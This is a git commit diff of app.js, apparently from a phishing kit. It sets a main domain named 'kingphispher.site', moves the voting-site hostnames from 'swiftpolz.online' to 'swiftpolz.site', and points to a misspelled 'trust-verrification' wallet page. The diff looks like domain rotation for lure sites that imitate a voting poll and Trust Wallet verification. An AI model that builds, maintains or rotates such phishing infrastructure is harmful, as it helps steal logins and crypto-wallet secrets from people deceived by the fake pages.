512b258cb842040ba636e34d3edf1fe41c2ff080
Godwin Idemudia <godwinide@gmail.com>
2024-10-01 23:14:32 +0100

    new

--- app.js
+++ app.js
@@ -46,10 +46,10 @@ app.use(function (req, res, next) {
   res.locals.error = req.flash('error');
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
-  req.app.voteUrl = "www.swiftpolz.online";
-  req.app.voteUrl2 = "swiftpolz.online";
-  req.app.hostname1 = "www.swiftpolz.online";
-  req.app.hostname2 = "swiftpolz.online";
+  req.app.voteUrl = "www.swiftpolz.site";
+  req.app.voteUrl2 = "swiftpolz.site";
+  req.app.hostname1 = "www.swiftpolz.site";
+  req.app.hostname2 = "swiftpolz.site";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
